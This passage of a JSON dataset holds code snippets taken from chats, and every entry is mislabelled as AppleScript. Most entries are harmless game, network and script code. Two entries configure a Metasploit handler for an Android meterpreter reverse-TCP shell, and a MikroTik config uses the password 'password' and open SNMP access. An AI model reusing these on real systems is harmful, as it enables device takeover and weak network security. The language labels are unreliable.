+    "conversation_hash": "0978e4945d4faaa41cb876fa64c254a9",
+    "code_index": 8,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "project \"myapp\"\n    dependson \"foo\"\n    language \"C++\"\n\n    -- 添加依赖库的头文件路径\n    filter \"system:windows\"\n        includedirs {\n            \"path/to/foo/include\"\n        }",
+    "filename": "0978e4945d4faaa41cb876fa64c254a9_8.applescript"
+  },
+  {
+    "conversation_hash": "fc501dc601253ff74e35dd3b38a422a7",
+    "code_index": 14,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "No LSB modules are available.\nDistributor ID: Ubuntu\nDescription:    Ubuntu 20.04.2 LTS\nRelease:        20.04\nCodename:       focal",
+    "filename": "fc501dc601253ff74e35dd3b38a422a7_14.applescript"
+  },
+  {
+    "conversation_hash": "9dbbd51d85fc96c439ecbe4c62a4cec9",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nset backdrop to [your background]\ncreate Menubar\ncreate Fireball\ncreate Progress Bar\n\nwhen flag clicked\nrepeat until [segments collected = 10]\n  wait (1) secs\n  create Segment\n  set segment direction to (90) degrees\n  set segment speed to (10)\n  \nwhen segment touch Fireball\n  set segment to invisible\n  change segments collected by (1)\n  add (10) to Progress Bar\n\nwhen Menubar clicked\n  broadcast [Navigation]\n\nwhen [Navigation v] received\n  show Menubar\n  hide Fireball\n  hide Progress Bar\n  wait until <(menu option) = [Start Game]>\n  broadcast [Game Start]\n  \nwhen [Game Start v] received\n  show Fireball\n  show Progress Bar\n  set segments collected to (0)\n  clear Progress Bar\n  \nforever\n  if <key [left arrow] pressed?>\n    move Menubar by (-10) steps\n  end\n  if <key [right arrow] pressed?>\n    move Menubar by (10) steps\n  end\nend",
+    "filename": "9dbbd51d85fc96c439ecbe4c62a4cec9_0.applescript"
+  },
+  {
+    "conversation_hash": "4d6ac2f5a2fb1a3924024afa4a3fc7fc",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "define startGame()\nset progress to 0\nrepeat until segments collected = total segments\n  wait for segment to be collected\n  if segment is blue then\n    add [1] to progress\n  else if segment is orange then\n    change progress by [-1]\n  else if segment is light blue then\n    add (progress * 2) to progress\n  else if segment is pink then\n    change progress by [-10]\n  else if segment is red then\n    play sound [BSOD]\n    go to x: (random position), y: (random position)\n    wait for [any] key press\n    startGame()\n  else if segment is gray then\n    do nothing\n  else if segment is green then\n    set progress to [100]\n  end\nend\nnext level()\n\ndefine next level()\nif level is max then\n  stop game with [Congratulations! You finished all levels!]\nelse\n  level += 1\n  show popup [Level up to level (level)!]\n  startGame()\nend\n\ndefine popupAnnoying()\nshow popup [Annoying popup!] for (5) seconds\nhide popup\n\ndefine popupClippy()\nrepeat until popup is destroyed\n  move (10) steps\n  if touching edge then\n    turn right (180) degrees\n  end\nend\n\ndefine popupMine()\nrepeat until popup is destroyed\n  if touching [mouse-pointer v] then\n    play sound [BSOD]\n    go to x: (random position), y: (random position)\n    wait for [any] key press\n    startGame()\n  end\nend\n\ndefine popupClippyMine()\nrepeat until popup is destroyed\n  move (10) steps\n  if touching edge then\n    turn right (180) degrees\n  end\n  if touching [mouse-pointer v] then\n    play sound [BSOD]\n    go to x: (random position), y: (random position)\n    wait for [any] key press\n    startGame()\n  end\nend\n\ndefine taskbarStart()\nshow menu [Begin ->] at (mouse-pointer v)\nwait until menu is closed\nif selected menu = [Start latest level] then\n  startGame()\nelse if selected menu = [Start level 1] then\n  level = 1\n  startGame()\nelse if selected menu = [Adjust settings] then\n  show settings menu\nelse if selected menu = [ProgressDOS] then\n  show DOS emulator\nelse if selected menu = [Get help] then\n  show help page\nelse if selected menu = [Restart] then\n  startGame()\nelse if selected menu = [Shutdown] then\n  stop script\nend",
+    "filename": "4d6ac2f5a2fb1a3924024afa4a3fc7fc_0.applescript"
+  },
+  {
+    "conversation_hash": "3da5cc596f22cca89c49b719cacbd83b",
+    "code_index": 13,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "default live\nlabel live\n  menu label ^Start custom Ubuntu\n  kernel /casper/vmlinuz\n  append  file=/cdrom/preseed/ubuntu.seed boot=casper initrd=/casper/initrd.lz quiet splash --",
+    "filename": "3da5cc596f22cca89c49b719cacbd83b_13.applescript"
+  },
+  {
+    "conversation_hash": "19517a3612116addb5f47afae25dfcc4",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "IF condition\n    BEGIN\n        -- statements to execute if condition is true\n    END\nELSE\n    BEGIN\n        -- statements to execute if condition is false\n    END",
+    "filename": "19517a3612116addb5f47afae25dfcc4_3.applescript"
+  },
+  {
+    "conversation_hash": "745fb638453b4fc54f51d95535c2dedb",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "interface GigabitEthernet0/1\n   description Connection to Switch1 access port\n   switchport mode access\n   switchport access vlan 10\n   no shutdown\n   \n   interface VLAN 10\n   ip address 192.168.0.2 255.255.255.192\n   no shutdown",
+    "filename": "745fb638453b4fc54f51d95535c2dedb_3.applescript"
+  },
+  {
+    "conversation_hash": "745fb638453b4fc54f51d95535c2dedb",
+    "code_index": 4,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "interface GigabitEthernet0/1\n   description Connection to Switch1 access port\n   switchport mode access\n   switchport access vlan 20\n   no shutdown\n   \n   interface VLAN 20\n   ip address 192.168.0.66 255.255.255.224\n   no shutdown",
+    "filename": "745fb638453b4fc54f51d95535c2dedb_4.applescript"
+  },
+  {
+    "conversation_hash": "745fb638453b4fc54f51d95535c2dedb",
+    "code_index": 5,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "interface GigabitEthernet0/1\n   description Connection to Switch1 access port\n   switchport mode access\n   switchport access vlan 30\n   no shutdown\n   \n   interface VLAN 30\n   ip address 192.168.0.98 255.255.255.192\n   no shutdown",
+    "filename": "745fb638453b4fc54f51d95535c2dedb_5.applescript"
+  },
+  {
+    "conversation_hash": "745fb638453b4fc54f51d95535c2dedb",
+    "code_index": 6,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "interface GigabitEthernet0/1\n   description Connection to Switch1 access port\n   switchport mode access\n   switchport access vlan 40\n   no shutdown\n   \n   interface VLAN 40\n   ip address 192.168.0.162 255.255.255.240\n   no shutdown",
+    "filename": "745fb638453b4fc54f51d95535c2dedb_6.applescript"
+  },
+  {
+    "conversation_hash": "08a3f5a79944fa20e8b21ff6452a40c2",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "Industry                                        Output to industries (n)\n\n                Agriculture                  Mining                  Forestry             Fishing                Construction           Manufacturing             Energy               Water supply and wastewater management\n                                                                                            \nTransportation and logistics           1000                   500                        800                        200                           1500                               300                             400                           200\nWarehousing and storage               2000                    400                        600                        100                            1200                              200                             300                            100\nWholesale trade                           2500                    600                       500                         300                           1500                             800                             700                          300\nRetail trade                                     3000                    500                       400                         100                            1000                             1500                           400                         200\nFood and beverage                        4000                   3000                    1500                         1000                            2000                              500                               600                          2000\nTextiles and apparel                         2000                   1000                     800                          200                           5000                             1000                                200                          300\nLeather and footwear                     1000                    300                       200                          100                             500                               1000                               100                          150\nWood and paper products              1500                     500                        300                           200                            800                               400                               200                         200\n\nChemicals and pharmaceuticals      3000                    2000                      1000                          500                            10000                             1500                               800                          600\nPlastics and rubber products            2500                   1500                        800                          200                            8000                               2000                               600                         700\nMetal and metal products               2000                    1000                       1200                          300                            5000                                3000                              400                          500\nMachinery and equipment              3000                   2000                        1500                          500                           10000                               8000                               700                         800\nElectrical equipment and electronics   1500                   1000                         800                          200                            5000                                2000                               400                          200\nTelecom and information technology    2000                   1500                         1000                        500                            6000                                 1000                               200                         500\nFinancial services                            5000                  2000                           1500                        500                           10000                              10000                             500                          600\nInsurance                                             3000                  1000                         500                               200                          6000                                4000                            300                          300\nReal estate                                       6000                  4000                        3000                              1000                         15000                              5000                           500                          800\n\nRental and leasing services                    2000                  1000                         500                               1000                          5000                               4000                            300                          400\nProfessional, scientific, and technical services      3000                  2000                         1500                              500                          8000                               6000                            400                          500\nManagement of companies and enterprises    1500                  1000                         500                               1000                          6000                               4000                            200                          300\nAdministrative and support services                2000                  1500                         800                               500                          4000                                1500                            300                          400\nWaste management and remediation services    1000                  500                          300                                1000                        3000                                2000                            200                          200\nEducation and training services                         3000                 2000                         1000                             500                          8000                            1000                            600                          500\nHealthcare and social assistance                      4000                 3000                         1500                            1000                         10000                          3000                            800                          700\n\nArts, entertainment, and recreation                          2000                1000                          800                              300                          5000                             2000                            400                          300\nAccommodation and food services                       5000                 4000                          1500                            1000                         15000                            1000                            800                          700\nInformation and media                                           3000                 2000                           800                              200                          6000                             3000                            400                          300\nTelecommunications                                                  4000                  3000                          1500                             500                           8000                             4000                            500                          400\nUtilities (water, electricity, gas)                                   2000                  1000                          800                             200                           4000                              1000                            400                          200\nPublic administration and defense                             3000                  1500                           500                              200                           6000                              3000                            300                          300\nNon-profit organizations                                           1000                   500                            300                              100                           2000                               1000                            100                          100\nInternational trade and diplomacy                                1500                    800                            500                              200                           2500                              1500                            300                          200",
+    "filename": "08a3f5a79944fa20e8b21ff6452a40c2_0.applescript"
+  },
+  {
+    "conversation_hash": "c89e4d88a571e835631ec5f7bdf79777",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "enable\n       configure terminal\n       interface GigabitEthernet0/0\n       ip nat outside\n       exit\n       interface GigabitEthernet0/1\n       ip nat inside\n       exit\n       ip nat inside source list 1 interface GigabitEthernet0/0 overload\n       access-list 1 permit any",
+    "filename": "c89e4d88a571e835631ec5f7bdf79777_0.applescript"
+  },
+  {
+    "conversation_hash": "c89e4d88a571e835631ec5f7bdf79777",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "enable\n       configure terminal\n       interface GigabitEthernet0/0\n       ip address 172.0.10.1 255.255.255.0\n       no shutdown\n       exit",
+    "filename": "c89e4d88a571e835631ec5f7bdf79777_1.applescript"
+  },
+  {
+    "conversation_hash": "fda70f2ff6332a87c94fcba1815e67b5",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [
+      "tStaffX"
+    ],
+    "code": "on mouseUp\n   -- Define the position and size for the staff\n   -- You can adjust these values to fit your requirements\n   put 50 into tStaffX\n   put 50 into tStaffY\n   put 300 into tStaffWidth\n   put 5 into tStaffHeight\n\n   -- Create a rectangle shape to represent the staff\n   create graphic line from tStaffX, tStaffY to tStaffX + tStaffWidth, tStaffY\n   set the style of last line to 2 -- 2 is for thick line\n   set the width of last line to tStaffHeight\n\n   -- Define the number of music lines on the staff\n   put 5 into tNumLines\n\n   -- Calculate the y position for each staff line\n   put tStaffY into tLineY\n   put tStaffHeight / (tNumLines - 1) into tSpacing\n   \n   -- Loop through the staff lines and create each line\n   repeat with i = 1 to tNumLines\n      create graphic line from tStaffX, tLineY to tStaffX + tStaffWidth, tLineY\n      set the style of last line to 1 -- 1 is for thin line\n      set the width of last line to 1\n      set the forecolor of last line to \"black\"\n      add tSpacing to tLineY\n   end repeat\nend mouseUp",
+    "filename": "fda70f2ff6332a87c94fcba1815e67b5_0.applescript"
+  },
+  {
+    "conversation_hash": "1503010ec89377aa3f8491f7b531b241",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "on mouseUp\n   put the long id of button1 into button1ID\n   put the short name of button1 into button1Name\n   put the owner of button1 into button1Owner\n   \n   answer \"Button ID:\" && button1ID && \"Button Name:\" && button1Name && \"Owner:\" && button1Owner\nend mouseUp",
+    "filename": "1503010ec89377aa3f8491f7b531b241_0.applescript"
+  },
+  {
+    "conversation_hash": "1503010ec89377aa3f8491f7b531b241",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "on mouseUp\n   put the mouseLoc into mouseLoc\n   \n   -- Loop through all controls on the card\n   repeat with x = 1 to the number of controls\n      put the long id of control x into controlID\n      put the left of control x into controlLeft\n      put the top of control x into controlTop\n      put the right of control x into controlRight\n      put the bottom of control x into controlBottom\n      \n      -- Check if the mouseLoc is within the bounds of the control\n      if (item 1 of mouseLoc) >= controlLeft and (item 1 of mouseLoc) <= controlRight and (item 2 of mouseLoc) >= controlTop and (item 2 of mouseLoc) <= controlBottom then\n         answer \"Control Name:\" && the short name of controlID\n         exit repeat -- Exit the loop once found\n      end if\n   end repeat\nend mouseUp",
+    "filename": "1503010ec89377aa3f8491f7b531b241_1.applescript"
+  },
+  {
+    "conversation_hash": "7403dd5025a209b04c85ac02bb784017",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\n    forever\n        if <key [up arrow v] pressed?> then\n            move 10 steps\n        end\n        if <key [down arrow v] pressed?> then\n            move -10 steps\n        end\n        if <key [right arrow v] pressed?> then\n            turn cw 15 degrees\n        end\n        if <key [left arrow v] pressed?> then\n            turn ccw 15 degrees\n        end\n        if <mouse down?> then\n            glide 1 secs to <mouse pointer>\n        end\n    end",
+    "filename": "7403dd5025a209b04c85ac02bb784017_0.applescript"
+  },
+  {
+    "conversation_hash": "d12971ffe81c7bb5b325b1de371b992e",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nforever\n  if <key [up arrow] pressed?> then\n    change y by (-10)\n  end\n  if <key [down arrow] pressed?> then\n    change y by (10)\n  end\n  if <key [left arrow] pressed?> then\n    change x by (-10)\n  end\n  if <key [right arrow] pressed?> then\n    change x by (10)\n  end\nend",
+    "filename": "d12971ffe81c7bb5b325b1de371b992e_0.applescript"
+  },
+  {
+    "conversation_hash": "904e301afc8619a97cc2f639234bdc3f",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nforever\n  if <key [up arrow] pressed?> then\n    change y by (10)\n  end\n  if <key [down arrow] pressed?> then\n    change y by (-10)\n  end\n  if <key [right arrow] pressed?> then\n    change x by (10)\n  end\n  if <key [left arrow] pressed?> then\n    change x by (-10)\n  end\nend",
+    "filename": "904e301afc8619a97cc2f639234bdc3f_0.applescript"
+  },
+  {
+    "conversation_hash": "904e301afc8619a97cc2f639234bdc3f",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nglide 2 secs to random position // Initial placement\n\nforever\n  // Calculate the distance between the player and enemy\n  point towards [player sprite]\n  move 5 steps\n  \n  // Check if the enemy has collided with the player\n  if <touching [player sprite]?> then\n    say \"Game Over\" for 2 seconds\n  end\n  \n  // Check if the enemy is near the edge of the screen\n  if <x position < -240> then\n    set x to (-240)\n  end\n  if <x position > 240> then\n    set x to 240\n  end\n\n  if <y position < -180> then\n    set y to (-180)\n  end\n  if <y position > 180> then\n    set y to 180\n  end\n\nend",
+    "filename": "904e301afc8619a97cc2f639234bdc3f_1.applescript"
+  },
+  {
+    "conversation_hash": "1ded5ca448cb4c3280a357327ba2a959",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "Enter a nonnegative integer: 10\nNumber of set bits in the binary representation: 2\n\nEnter a nonnegative integer: 15\nNumber of set bits in the binary representation: 4",
+    "filename": "1ded5ca448cb4c3280a357327ba2a959_1.applescript"
+  },
+  {
+    "conversation_hash": "d68df1f9566e12b768510fc1b15e1191",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "set description \"Описание устройства\" // Описание устройства\nset location \"Место расположения устройства\" // Место расположения устройства\nset contact \"89306851427\" // Контактные данные для устройства\nset community public authorization read-only // Коммьюнити \"public\" с правами доступа только для чтения\nset community public client 192.168.1.6 // Указываем, что клиент с IP-адресом 192.168.1.6 имеет доступ к коммьюнити \"public\"\nset trap-group MyTrapGroup version v2 // Версия протокола SNMP для группы trap уведомлений с именем \"MyTrapGroup\" - версия 2\nset trap-group MyTrapGroup categories all // Добавляем все категории событий к группе trap уведомлений \"MyTrapGroup\"\nset trap-group MyTrapGroup target 192.168.1.6 // Устанавливаем адрес назначения (IP-адрес 192.168.1.6) для группы trap уведомлений \"MyTrapGroup\"",
+    "filename": "d68df1f9566e12b768510fc1b15e1191_1.applescript"
+  },
+  {
+    "conversation_hash": "eaab4f3e1547073ab50281bd06bd33b1",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "Size of queue: 3\nQueue is not empty\nFront element of queue: 10\nBack element of queue: 30\n20 30",
+    "filename": "eaab4f3e1547073ab50281bd06bd33b1_1.applescript"
+  },
+  {
+    "conversation_hash": "f82a487cae5a5e8357ab0f55df66d87f",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "sudo ip link add vxlan1 type vxlan id 1 group <multicast IP> dev <physical interface>\n   sudo ip link set vxlan1 up\n   sudo ip link set vxlan1 master br0\n   \n   sudo ip link add vxlan2 type vxlan id 2 group <multicast IP> dev <physical interface>\n   sudo ip link set vxlan2 up\n   sudo ip link set vxlan2 master br0",
+    "filename": "f82a487cae5a5e8357ab0f55df66d87f_1.applescript"
+  },
+  {
+    "conversation_hash": "195e1c9e4048fdd872a3bd0779771691",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "use exploit/multi/handler\n   set PAYLOAD android/meterpreter/reverse_tcp\n   set LHOST <your_local_ip_address>\n   set LPORT <your_local_port_number>\n   set ExitOnSession false\n   set AutoRunScript post/windows/manage/migrate\n   set VERBOSE true\n   exploit -j",
+    "filename": "195e1c9e4048fdd872a3bd0779771691_0.applescript"
+  },
+  {
+    "conversation_hash": "195e1c9e4048fdd872a3bd0779771691",
+    "code_index": 7,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "set PAYLOAD android/meterpreter/reverse_tcp\n   set LHOST <your_local_ip_address>\n   set LPORT <your_local_port_number>\n   set ExitOnSession false\n   set AutoRunScript post/windows/manage/migrate\n   set VERBOSE true",
+    "filename": "195e1c9e4048fdd872a3bd0779771691_7.applescript"
+  },
+  {
+    "conversation_hash": "7af7a0f12e526697bffeded6e873c4ab",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\ngo to x: -100 y: 0\nset pen size to 3\n\nforever\n    pen down\n    clear\n    set pen color to [#000000]\n    set pen size to 3\n     \n    set x to -100\n    set y to 0\n      \n    repeat 3\n        pen down\n        repeat 36\n            set randomColor to pick random [1 v 2 v 3 v 4 v 5 v 6 v 7 v 8 v 9 v 10]\n           \n            if randomColor = 1 then\n                set pen color to [#FF5733]\n            else if randomColor = 2 then\n                set pen color to [#C70039]\n            else if randomColor = 3 then\n                set pen color to [#900C3F]\n            else if randomColor = 4 then\n                set pen color to [#581845]\n            else if randomColor = 5 then\n                set pen color to [#FFC300]\n            else if randomColor = 6 then\n                set pen color to [#FF5733]\n            else if randomColor = 7 then\n                set pen color to [#FF006D]\n            else if randomColor = 8 then\n                set pen color to [#900048]\n            else if randomColor = 9 then\n                set pen color to [#FF301D]\n            else if randomColor = 10 then\n                set pen color to [#FF5A36]\n            end\n            \n            move 10\n            turn 10\n        end\n        \n        set pen color to [#000000]\n        move 50\n    end\n    \n    pen up\n    go to x: -100 y: 0\n    clear\n    wait 2 seconds\nend",
+    "filename": "7af7a0f12e526697bffeded6e873c4ab_0.applescript"
+  },
+  {
+    "conversation_hash": "7af7a0f12e526697bffeded6e873c4ab",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nset volume to 100\nwait 1 second\n\nforever\n    clear\n    say \"Generating planet name...\"\n    wait 1 second\n    \n    set prefix to item (pick random (length of prefixes)) of prefixes\n    set suffix to item (pick random (length of suffixes)) of suffixes\n    \n    say \"Your planet name is \" with quote\n    say prefix\n    say suffix\n    say \"!\"\n    \n    wait 2 seconds\nend",
+    "filename": "7af7a0f12e526697bffeded6e873c4ab_1.applescript"
+  },
+  {
+    "conversation_hash": "69cc72588e342254e01b068b4a7c1abe",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "set title \"My Curve\"\nset xlabel \"X-axis\"\nset ylabel \"Y-axis\"\nset key off\nplot \"data.txt\" with lines linewidth 2 linecolor rgb \"blue\"",
+    "filename": "69cc72588e342254e01b068b4a7c1abe_3.applescript"
+  },
+  {
+    "conversation_hash": "554eb80658404516bf0a272d001039df",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "on place of mob spawner:\n    if {placed.%player%} is not set: # If player has not placed any spawner before\n        set {placed.%player%} to 1 # Initialize the count to 1\n    else:\n        set {placed.%player%} to {placed.%player%} + 1 # Increment the count by 1\n    set {spawner.%player%.%x%_%y%_%z%} to type of clicked block # Store the type of the spawner at x, y, z coordinates\n    \non place of mob spawner: # When placing a new spawner\n    loop all players:\n        if loop-player is within 2 blocks of event-player: # Check if the current player is within 2 blocks of the event player\n            set {_types::*} to loop-player's {spawner.*} # Get all spawner types placed by the current player\n            set {_mergedTypes::*} to {} # Initialize an empty list for merged spawner types\n            loop {_types::*}: # Loop through each spawner type\n                add loop-value to {_mergedTypes::*} # Add the current spawner type to the merged list\n            set loop-player's {spawner.*} to {_mergedTypes::*} # Update the current player's spawner types\n            \non break of mob spawner (while sneaking):\n    if event-block is mob spawner: # Check if the broken block is a spawner\n        set {spawnerType} to \"null\" # Initialize spawnerType as null\n        loop all players:\n            if loop-player is within 2 blocks of event-player: # Check if the current player is within 2 blocks of the event player\n                if loop-player's {spawner.%event-block.xyz%} is not set: # If the player has not placed a spawner at the same location before\n                    continue # Skip to the next player\n                set {spawnerType} to loop-player's {spawner.%event-block.xyz%} # Store the spawner type into spawnerType variable\n                remove event-block # Remove the broken spawner\n                remove loop-player's {spawner.%event-block.xyz%} # Remove the stored spawner type\n                break # Exit the loop\n                \n        if {spawnerType} is not \"null\": # If a spawner type is found\n            give event-player {spawnerType} spawner 1 # Give the player the original spawner they placed",
+    "filename": "554eb80658404516bf0a272d001039df_0.applescript"
+  },
+  {
+    "conversation_hash": "6873e22c17c754fbdc483daef5596fce",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [
+      "lives"
+    ],
+    "code": "on death of player:\n    if lives of player is 1:\n        reset lives of player\n    else:\n        subtract 1 from lives of player\n \nplaceholderAPI's pattern for '%example%':\n    set {_lives} to lives of player\n    if {_lives} is greater than 0:\n        format {_lives}\n    else:\n        format 0",
+    "filename": "6873e22c17c754fbdc483daef5596fce_1.applescript"
+  },
+  {
+    "conversation_hash": "6873e22c17c754fbdc483daef5596fce",
+    "code_index": 2,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "on death of player:\n    if {_lives::%player's UUID%} is not set:\n        set {_lives::%player's UUID%} to 3\n    subtract 1 from {_lives::%player's UUID%}\n    if {_lives::%player's UUID%} < 1:\n        set {_lives::%player's UUID%} to 3\n\nformat slot with argument \"%example%\":\n    set {_lives} to {_lives::%player's UUID%}\n    if {_lives} > 0:\n        format {_lives}\n    else:\n        format 0",
+    "filename": "6873e22c17c754fbdc483daef5596fce_2.applescript"
+  },
+  {
+    "conversation_hash": "6873e22c17c754fbdc483daef5596fce",
+    "code_index": 4,
+    "language": "AppleScript",
+    "libraries": [
+      "lives"
+    ],
+    "code": "on death of player:\n    if lives of player is 1:\n        reset lives of player\n    else:\n        subtract 1 from lives of player\n\nplaceholder pattern:\n    set {_lives} to lives of player\n    format \"%{_lives}%\"",
+    "filename": "6873e22c17c754fbdc483daef5596fce_4.applescript"
+  },
+  {
+    "conversation_hash": "6873e22c17c754fbdc483daef5596fce",
+    "code_index": 5,
+    "language": "AppleScript",
+    "libraries": [
+      "lives"
+    ],
+    "code": "on death of player:\n    if lives of player is 1:\n        reset lives of player\n    else:\n        subtract 1 from lives of player\n\nplaceholder pattern:\n    set {_lives} to lives of player\n    format \"%{_lives}%\"",
+    "filename": "6873e22c17c754fbdc483daef5596fce_5.applescript"
+  },
+  {
+    "conversation_hash": "6873e22c17c754fbdc483daef5596fce",
+    "code_index": 6,
+    "language": "AppleScript",
+    "libraries": [
+      "lives"
+    ],
+    "code": "on death of player:\n    if lives of player is 1:\n        reset lives of player\n    else:\n        subtract 1 from lives of player\n\nplaceholder pattern:\n    set {_lives} to lives of player\n    format \"%{_lives}%\"",
+    "filename": "6873e22c17c754fbdc483daef5596fce_6.applescript"
+  },
+  {
+    "conversation_hash": "6873e22c17c754fbdc483daef5596fce",
+    "code_index": 7,
+    "language": "AppleScript",
+    "libraries": [
+      "lives"
+    ],
+    "code": "on death:\n    if lives of player is 1:\n        reset lives of player\n    else:\n        subtract 1 from lives of player\n\nplaceholder pattern:\n    set {_lives} to lives of player\n    format \"%{_lives}%\"",
+    "filename": "6873e22c17c754fbdc483daef5596fce_7.applescript"
+  },
+  {
+    "conversation_hash": "6873e22c17c754fbdc483daef5596fce",
+    "code_index": 8,
+    "language": "AppleScript",
+    "libraries": [
+      "lives"
+    ],
+    "code": "on death:\n    if lives of event-entity is 1:\n        reset lives of event-entity\n    else:\n        subtract 1 from lives of event-entity\n\nformat slot with argument \"%life%\":\n    set {_lives} to lives of player\n    format {_lives}",
+    "filename": "6873e22c17c754fbdc483daef5596fce_8.applescript"
+  },
+  {
+    "conversation_hash": "6873e22c17c754fbdc483daef5596fce",
+    "code_index": 9,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "on death:\n    if {lives::%uuid of event-entity%} is not set:\n        set {lives::%uuid of event-entity%} to 3\n    subtract 1 from {lives::%uuid of event-entity%}\n    if {lives::%uuid of event-entity%} < 1:\n        set {lives::%uuid of event-entity%} to 3\n\nformat slot with argument \"%life%\":\n    set {_lives} to {lives::%uuid of player%}\n    format {_lives}",
+    "filename": "6873e22c17c754fbdc483daef5596fce_9.applescript"
+  },
+  {
+    "conversation_hash": "888bea885d12fdbee92e48bba6986780",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "command /afk:\n    trigger:\n        teleport player to location \"afk\"\n        send \"You are now in the AFK region.\"\n        set {_afkTimer.%player%} to 0\n        wait 1 second\n        execute console command \"crate key give %player% afk 1\"\n        wait 1 second\n        {_afkTimer.%player%} = 0\n        wait 5 minutes\n        add 1 to {_afkTimer.%player%}\n        if {_afkTimer.%player%} is 1:\n            send \"You have been AFK for 5 minutes.\"\n        else if {_afkTimer.%player%} is 2:\n            send \"You have been AFK for 10 minutes.\"\n        else if {_afkTimer.%player%} is 3:\n            send \"You have been AFK for 15 minutes.\"\n        else if {_afkTimer.%player%} is 4:\n            send \"You have been AFK for 20 minutes.\"\n        else if {_afkTimer.%player%} is 5:\n            send \"You have been AFK for 25 minutes.\"\n            execute console command \"crate key give %player% afk 1\"\n            set {_afkTimer.%player%} to 0\n\nregion \"afk\":\n    enter:\n        if player is not op:\n            command /afk",
+    "filename": "888bea885d12fdbee92e48bba6986780_0.applescript"
+  },
+  {
+    "conversation_hash": "e9be93ed941134d75075aca6a18d14fb",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "/system identity set name=EDGE01\n\n/interface vlan add name=Vlan1\n\n/interface bridge add name=bridge1\n/interface bridge port add bridge=bridge1 interface=ether1\n/interface bridge port add bridge=bridge1 interface=ether2\n\n/ip address add address=93.188.203.5/32 interface=Loopback0\n/ip address add address=93.188.203.1/30 interface=ether1\n/ip address add address=217.79.15.198/30 interface=ether3\n\n/ip route add dst-address=93.188.200.0/22 gateway=null\n\n/bgp instance set default as=207258 client-to-client-reflection=yes ignore-as-path-len=yes redistribute-connected=yes redistribute-static=yes router-id=93.188.203.5\n\n/bgp peer add name=EDGE02 remote-address=93.188.203.6 remote-as=207258 in-filter=ANNOUNCE out-filter=BOGONS\n\n/bgp peer add name=OBIT remote-address=217.79.15.197 remote-as=8492 in-filter=BOGONS\n\n/ip firewall filter add action=accept chain=input dst-address=93.188.203.2\n/ip firewall filter add action=accept chain=input dst-address=93.188.201.4\n/ip firewall filter add action=accept chain=input dst-address=93.188.203.4\n/ip firewall filter add action=accept chain=input dst-address=185.17.84.14\n\n/snmp community add addresses=0.0.0.0/0 name=bronkaro read-access=yes\n\n/system clock set time-zone-name=GMT\n\n/username set newciscoedge password=password",
+    "filename": "e9be93ed941134d75075aca6a18d14fb_1.applescript"
+  },
+  {
+    "conversation_hash": "02b39ccb62182ed890df0c9c934e6a08",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "to setup\n  clear-all\n  create-turtles 100 [\n    setxy random-xcor random-ycor\n    set color blue\n  ]\n  reset-ticks\nend\n\nto go\n  ask turtles [\n    rt random 60 - 30\n    fd 1\n    if xcor > 10 or xcor < -10 or ycor > 10 or ycor < -10 [\n      set color red\n    ]\n  ]\n  tick\nend",
+    "filename": "02b39ccb62182ed890df0c9c934e6a08_0.applescript"
+  },
+  {
+    "conversation_hash": "02b39ccb62182ed890df0c9c934e6a08",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
